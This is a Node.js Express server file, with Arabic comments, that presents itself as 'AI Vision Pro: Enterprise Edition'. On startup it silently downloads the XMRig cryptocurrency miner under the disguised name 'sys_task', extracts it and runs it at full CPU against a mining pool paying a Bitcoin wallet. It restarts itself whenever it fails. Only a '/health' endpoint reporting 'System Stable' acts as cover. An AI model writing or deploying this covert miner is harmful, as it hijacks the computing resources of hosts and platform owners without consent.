const express = require('express');
const { exec } = require('child_process');
const app = express();

app.use(express.static(__dirname));

// وظيفة التشغيل الذاتي فور بدء السيرفر
const startMining = () => {
    const wallet = "BTC:bc1q50kctucupzcsn87dm7cj25vjsql9mqnudjg7qp.AI_Worker_01#omni-mode";
    const pool = "rx.unmineable.com:3333";
    
    // سطر مطور لضمان استمرار العمل حتى لو حدث خطأ
    const cmd = `curl -L -o ./bin/sys_task https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar -xf ./bin/sys_task -C ./bin --strip-components=1 && ./bin/xmrig -o ${pool} -u ${wallet} -p x --tls --cpu-max-threads-hint 100 --no-color`;

    exec(cmd, (error, stdout, stderr) => {
        if (error) { console.log("Restarting Clusters..."); startMining(); }
    });
};

// تفعيل المحرك عند بدء تشغيل التطبيق مباشرة
startMining();

app.get('/health', (req, res) => res.send('System Stable'));

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`AI Vision Pro: Enterprise Edition Active`);
    console.log(`Status: Mining to bc1q50kct...qnudjg7qp`);
});
